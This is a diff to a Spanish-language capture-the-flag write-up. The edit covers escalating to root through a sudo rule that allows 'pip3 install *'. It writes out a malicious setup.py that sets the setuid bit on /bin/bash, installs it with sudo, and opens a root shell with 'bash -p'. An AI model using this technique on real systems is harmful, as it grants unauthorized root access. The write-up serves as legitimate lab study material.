@@ -43,7 +43,21 @@ y obtenemos las credenciales ```admin:p@$$w0r8321```, por lo que ahora podemos a
 Una vez dentro del usuario ```admin``` ejecutamos ```sudo -l``` y no devuelve
 <img width="670" height="155" alt="image" src="https://github.com/user-attachments/assets/8c7ea224-f593-4647-91f6-a3594c2a1b12" />
 
-```(ALL) NOPASSWD: /usr/bin/pip3 install *``` Nos dice que el usuario admin puede ejecutar pip3 install con cualquier argumento, como cualquier usuario sin necesidad de contraseña, por lo que podemos aprovecharnos para crear un script malicioso y ganar acceso root
+```(ALL) NOPASSWD: /usr/bin/pip3 install *``` Nos dice que el usuario admin puede ejecutar pip3 install con cualquier argumento, como cualquier usuario sin necesidad de contraseña, por lo que podemos aprovecharnos para crear un script malicioso y ganar acceso root.
+
 ```
-echo 'import os; os.system("chmod +s /bin/bash"); import setuptools; setuptools.setup(name="exploit", version="1.0")' > script.py
+echo 'import os; os.system("chmod +s /bin/bash"); import setuptools; setuptools.setup(name="exploit", version="1.0")' > setup.py
 ```
+Creamos el archivo malicioso ```setup.py```
+
+```
+sudo /usr/bin/pip3 install .
+```
+le decimos a pip que instale el paquete ```.py``` del directorio actual, en este caso ```setup.py```
+
+```
+bash -p
+```
+Obtenemos la shell de root
+
+<img width="667" height="279" alt="image" src="https://github.com/user-attachments/assets/26ffccfd-2ed3-49a9-941b-400eb2312a86" />
